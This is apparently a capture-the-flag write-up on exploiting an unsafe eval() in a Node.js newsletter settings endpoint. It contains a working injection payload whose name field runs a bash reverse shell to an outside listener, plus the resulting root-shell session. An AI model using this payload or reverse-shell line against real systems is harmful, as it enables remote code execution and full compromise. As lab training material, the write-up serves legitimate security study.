1. Source-code review                                                                                                                                                                     
      The pentester identifies the unsafe eval() call in src/database.js inside saveSettings():                                                                                              
                                                                                                                                                                                             
      ```js                                                                                                                                                                                  
        eval(`var specialChars = ['#', ';', '\\'', '"', '\\\\']; "${settings.greeting}".split('').some(char => specialChars.includes(char))`)                                                
      ```                                                                                                                                                                                    
                                                                                                                                                                                             
      Because settings.greeting is interpolated directly into the executed string, it becomes a code-injection sink.                                                                         
                                                                                                                                                                                             
   2. Craft and submit the malicious settings payload                                                                                                                                        
      The greeting field has a short length limit, so the pentester stores the full reverse-shell JavaScript in the unrestricted name field and uses the greeting field as an eval()         
      trampoline. The following JSON is sent to POST /api/settings/save:                                                                                                                     
                                                                                                                                                                                             
      ```json                                                                                                                                                                                
        {                                                                                                                                                                                    
          "name": "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.17.8/4444 0>&1\"')",                                                                               
          "email": "michael@vitamedix.htb",                                                                                                                                                  
          "frequency": "daily",                                                                                                                                                              
          "timezone": "UTC",                                                                                                                                                                 
          "greeting": "\"+eval(settings.name)+\"",                                                                                                                                           
          "feedback": "no",                                                                                                                                                                  
          "heatmaps": "no"                                                                                                                                                                   
        }                                                                                                                                                                                    
      ```                                                                                                                                                                                    
                                                                                                                                                                                             
   3. Server-side evaluation                                                                                                                                                                 
      The eval() string becomes:                                                                                                                                                             
                                                                                                                                                                                             
      ```js                                                                                                                                                                                  
        var specialChars = ['#', ';', '\'', '"', '\\']; ""+eval(settings.name)+"".split('').some(char => specialChars.includes(char))                                                        
      ```                                                                                                                                                                                    
                                                                                                                                                                                             
      The expression eval(settings.name) executes the contents of the name field, which calls child_process.execSync() with a bash reverse shell.                                            
                                                                                                                                                                                             
   4. Reverse shell and flag retrieval                                                                                                                                                       
      The server opens a TCP connection back to the pentester’s listener, giving a root shell inside the container:                                                                          
                                                                                                                                                                                             
      ```bash                                                                                                                                                                                
        ❯ sudo nc -lvnp 4444                                                                                                                                                                 
        listening on [any] 4444 ...                                                                                                                                                          
        connect to [10.10.17.8] from (UNKNOWN) [10.129.229.86] 33586                                                                                                                         
        bash: cannot set terminal process group (24): Inappropriate ioctl for device                                                                                                         
        bash: no job control in this shell                                                                                                                                                   
        root@c09392e1d8a9:/app# cd /                                                                                                                                                         
        cd /                                                                                                                                                                                 
        root@c09392e1d8a9:/# dir                                                                                                                                                             
        374a6b7d1b4d5527b8d88668ecd0de0a.txt  boot  home   media  proc  sbin  tmp                                                                                                            
        app                                   dev   lib    mnt    root  srv   usr                                                                                                            
        bin                                   etc   lib64  opt    run   sys   var                                                                                                            
        root@c09392e1d8a9:/# cat 374a6b7d1b4d5527b8d88668ecd0de0a.txt                                                                                                                        
        7c6ada9cb7aa60c7740bcb1dde7496bf                                                                                                                                                     
        root@c09392e1d8a9:/#                                                                                                                                                                 
      ```                                                                                                                                                                                    
                                                                                                                                                                                             
   Result: The unsafe eval() validation in the newsletter settings endpoint allows an authenticated attacker to execute arbitrary system commands as root, leading to full container         
   compromise and exposure of the flag.   